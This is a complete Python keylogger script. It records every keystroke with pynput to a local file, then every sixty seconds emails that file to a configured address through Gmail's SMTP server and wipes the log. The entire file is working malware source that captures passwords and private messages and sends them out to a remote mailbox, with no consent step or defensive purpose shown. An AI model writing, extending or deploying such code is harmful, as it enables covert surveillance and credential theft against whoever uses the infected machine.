from pynput import keyboard
import smtplib
import threading
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from dotenv import load_dotenv

load_dotenv()

EMAIL_ADDRESS = os.getenv("EMAIL")
EMAIL_PASSWORD = os.getenv("PASSWORD")
LOG_FILE = "keylog.txt"
SEND_INTERVAL = 60  # seconds
exit_press_count = 0

# Ensure log file is created on startup
if not os.path.exists(LOG_FILE):
    open(LOG_FILE, "w").close()

def write_to_file(key):
    global exit_press_count
    try:
        with open(LOG_FILE, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                if key == key.space:
                    f.write(" ")
                elif key == key.enter:
                    f.write("\n")
                elif key == key.esc:
                    exit_press_count += 1
                    f.write("[ESC]")
                    if exit_press_count >= 2:
                        print("[*] Exit key combo detected. Stopping keylogger.")
                        os._exit(0)
                else:
                    f.write(f"[{key.name}]")
    except Exception as e:
        print(f"[!] Failed to write to file: {e}")

def send_email():
    try:
        # Prepare the email
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS
        msg['Subject'] = "Keylogger Log File"

        msg.attach(MIMEText("Attached is the latest keylog file.", 'plain'))

        with open(LOG_FILE, 'rb') as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={LOG_FILE}')
            msg.attach(part)

        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)

        print("[+] Email sent.")

        # Clear the file after sending
        open(LOG_FILE, "w").close()

    except Exception as e:
        print(f"[!] Failed to send email: {e}")

    finally:
        # Reschedule next email after SEND_INTERVAL
        timer = threading.Timer(SEND_INTERVAL, send_email)
        timer.daemon = True
        timer.start()

def start_keylogger():
    send_email()  # Start first email send timer
    with keyboard.Listener(on_press=write_to_file) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
